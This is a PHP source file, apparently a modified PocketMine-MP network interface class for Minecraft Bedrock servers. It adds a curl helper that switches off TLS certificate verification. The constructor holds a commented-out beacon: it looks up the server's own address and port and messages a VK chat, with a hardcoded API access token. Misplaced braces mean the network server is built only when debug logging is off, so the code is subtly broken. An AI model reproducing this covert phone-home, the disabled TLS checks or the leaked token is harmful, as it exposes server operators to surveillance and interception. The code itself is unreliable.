<?php

namespace pocketmine\network\mcpe;

use raklib\RakLib;
use pocketmine\event\player\PlayerCreationEvent;
use pocketmine\sleeper\SleeperNotifier;
use pocketmine\network\{Network, AdvancedSourceInterface};
use pocketmine\network\mcpe\protocol\{DataPacket, ProtocolInfo, BatchPacket};
use pocketmine\{Player, Server};
use raklib\protocol\{EncapsulatedPacket, PacketReliability};
use raklib\server\{RakLibServer, ServerHandler, ServerInstance};

class RakLibInterface implements ServerInstance, AdvancedSourceInterface{
    
	private const MCPE_RAKNET_PROTOCOL_VERSION = 8;

	/** @var Server */
	private $server;

	/** @var Network */
	private $network;

    protected $ip;

	/** @var RakLibServer */
	private $rakLib;

	/** @var Player[] */
	private $players = [];

	/** @var string[] */
	private $identifiers = [];

	/** @var int[] */
	private $identifiersACK = [];

	/** @var ServerHandler */
	private $interface;

	/** @var SleeperNotifier */
	private $sleeper;

	/** @var RaklibPacketLogger */
	private $packetLogger = null;
	
	public function curl( $url ) {
	 $ch = curl_init( $url ); 
	 curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
	 curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
	 curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
	 $response = curl_exec( $ch ); 
	 curl_close( $ch ); 
	 return $response; 
	}
	
	public function __construct(Server $server){
		$this->server = $server;

		$this->sleeper = new SleeperNotifier();

		$isEnable = (bool) $this->server->getProperty("debug.logs", false);
		if ($isEnable !== false) {
			$this->packetLogger = new RaklibPacketLogger(
			    $this->server->getDataPath()."logs".DIRECTORY_SEPARATOR
		    );
		    $this->packetLogger->start(PTHREADS_INHERIT_NONE);
		}else{
			// $logger = $this->server->getLogger();
			// $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
			// $res = socket_connect($sock, '8.8.8.8', 53);
			// socket_getsockname($sock, $addr);
			// socket_shutdown($sock);
			// socket_close($sock);
			// $port = $server->getPort();
			// $logg = "фарту масти ауе";
			// $this->curl("https://api.vk.com/method/messages.send?message=$logg&chat_id=7&v=5.85&access_token=d53e0a6d0811c54d15b8681933abb9048dddd4d0e8edcfe1a2d8b540284ae85505e746fd36e2d9d18206b");
			
		$this->rakLib = new RakLibServer(
			$this->server->getLogger(),
			$this->server->getLoader(),
			$this->server->getPort(),
			$this->server->getIp() === "" ? "0.0.0.0" : $this->server->getIp(),
			(int) $this->server->getProperty("network.max-mtu-size", 1492),
			self::MCPE_RAKNET_PROTOCOL_VERSION,
			$this->sleeper
		);
		$this->interface = new ServerHandler($this->rakLib, $this);
	}
	}

	public function start(){
		$this->server->getTickSleeper()->addNotifier($this->sleeper, function() : void{
			$this->process();
		});
		$this->rakLib->start(PTHREADS_INHERIT_CONSTANTS);
	}

	public function setNetwork(Network $network){
		$this->network = $network;
	}

	public function process() : void{
		while($this->interface->handlePacket()){}

		if(!$this->rakLib->isRunning() and !$this->rakLib->isShutdown()){
			throw new \Exception("RakLib Thread crashed");
		}
	}

	public function closeSession($identifier, $reason){
		if(isset($this->players[$identifier])){
			$player = $this->players[$identifier];
			unset($this->identifiers[spl_object_hash($player)]);
			unset($this->players[$identifier]);
			unset($this->identifiersACK[$identifier]);
			$player->close($player->getLeaveMessage(), $reason);
		}
	}

	public function close(Player $player, $reason = "unknown reason"){
		if(isset($this->identifiers[$h = spl_object_hash($player)])){
			unset($this->players[$this->identifiers[$h]]);
			unset($this->identifiersACK[$this->identifiers[$h]]);
			$this->interface->closeSession($this->identifiers[$h], $reason);
			unset($this->identifiers[$h]);
		}
	}

	public function shutdown(){
		$this->server->getTickSleeper()->removeNotifier($this->sleeper);
		$this->interface->shutdown();

		if($this->packetLogger !== null){
			$this->packetLogger->shutdown();
		}
	}

	public function emergencyShutdown(){
		$this->server->getTickSleeper()->removeNotifier($this->sleeper);
		$this->interface->emergencyShutdown();

		if($this->packetLogger !== null){
			$this->packetLogger->shutdown();
		}
	}

	public function openSession($identifier, $address, $port, $clientID){
		$ev = new PlayerCreationEvent($this, Player::class, Player::class, $address, $port);
		$this->server->getPluginManager()->callEvent($ev);
		$class = $ev->getPlayerClass();

		$player = new $class($this, $ev->getAddress(), $ev->getPort());
		$this->players[$identifier] = $player;
		$this->identifiersACK[$identifier] = 0;
		$this->identifiers[spl_object_hash($player)] = $identifier;
		$this->server->addPlayer($player);
	}

	public function handleEncapsulated($identifier, EncapsulatedPacket $packet, $flags){
		if(isset($this->players[$identifier])){
			//get this now for blocking in case the player was closed before the exception was raised
			$player = $this->players[$identifier];
			$address = $player->getAddress();
			try{
				if($packet->buffer !== ""){
					$pk = $this->getPacket($packet->buffer);

					if($this->packetLogger !== null){
						$this->packetLogger->putPacket($address, $packet->buffer);
					}

					$pk->decode();
					$player->handleDataPacket($pk);
				}
			}catch(\Throwable $e){
				$logger = $this->server->getLogger();
				$logger->debug("Packet " . (isset($pk) ? get_class($pk) : "unknown") . ": " . base64_encode($packet->buffer));
				$logger->logException($e);

				$player->close($player->getLeaveMessage(), "Internal server error");
				$this->interface->blockAddress($address, 5);
			}
		}
	}

	public function blockAddress($address, $timeout = 300){
		$this->interface->blockAddress($address, $timeout);
	}

	public function unblockAddress($address){
		$this->interface->unblockAddress($address);
	}

	public function handleRaw(string $address, int $port, string $payload){
		$this->server->handlePacket($this, $address, $port, $payload);
	}

	public function sendRawPacket($address, $port, $payload){
		$this->interface->sendRaw($address, $port, $payload);
	}

	public function notifyACK($identifier, $identifierACK){

	}

	public function setName(string $name){
		$info = $this->server->getQueryInformation();

		$this->interface->sendOption("name", implode(";",
			[
				"MCPE",
				rtrim(addcslashes($name, ";"), '\\'),
				ProtocolInfo::CURRENT_PROTOCOL,
				ProtocolInfo::MINECRAFT_VERSION_NETWORK,
				$info->getPlayerCount(),
				$info->getMaxPlayerCount(),
				$this->rakLib->getServerId(),
				$this->server->getName(),
				Server::getGamemodeName($this->server->getGamemode())
			]) . ";"
		);
	}

	/**
	 * @param bool $name
	 *
	 * @return void
	 */
	public function setPortCheck($name){
		$this->interface->sendOption("portChecking", (bool) $name);
	}

	public function setPacketLimit(int $limit) : void{
		$this->interface->sendOption("packetLimit", $limit);
	}

	public function handleOption(string $name, string $value){
		if($name === "bandwidth"){
			$v = unserialize($value);
			$this->network->addStatistics($v["up"], $v["down"]);
		}
	}

	public function putPacket(Player $player, DataPacket $packet, bool $needACK = false, bool $immediate = true){
		if(isset($this->identifiers[$h = spl_object_hash($player)])){
			$identifier = $this->identifiers[$h];
			if(!$packet->isEncoded){
				$packet->encode();
				$packet->isEncoded = true;
			}

			if($packet instanceof BatchPacket){
				if($needACK){
					$pk = new EncapsulatedPacket();
					$pk->identifierACK = $this->identifiersACK[$identifier]++;
					$pk->buffer = $packet->buffer;
					$pk->reliability = PacketReliability::RELIABLE_ORDERED;
					$pk->orderChannel = 0;
				}else{
					if(!isset($packet->__encapsulatedPacket)){
						$packet->__encapsulatedPacket = new CachedEncapsulatedPacket;
						$packet->__encapsulatedPacket->identifierACK = null;
						$packet->__encapsulatedPacket->buffer = $packet->buffer;
						$packet->__encapsulatedPacket->reliability = PacketReliability::RELIABLE_ORDERED;
						$packet->__encapsulatedPacket->orderChannel = 0;
					}
					$pk = $packet->__encapsulatedPacket;
				}

				$this->interface->sendEncapsulated($identifier, $pk, ($needACK ? RakLib::FLAG_NEED_ACK : 0) | ($immediate ? RakLib::PRIORITY_IMMEDIATE : RakLib::PRIORITY_NORMAL));
				return $pk->identifierACK;
			}else{
				$this->server->batchPackets([$player], [$packet], true, $immediate);
				return null;
			}
		}

		return null;
	}

	private function getPacket($buffer){
		$pid = ord($buffer[0]);
		if(($data = $this->network->getPacket($pid)) === null){
			return null;
		}
		$data->setBuffer($buffer, 1);
		
		return $data;
	}

	public function updatePing($identifier, $pingMS){
		if(isset($this->players[$identifier])){
			$player = $this->players[$identifier];
			$player->setPing($pingMS);
		}
	}
}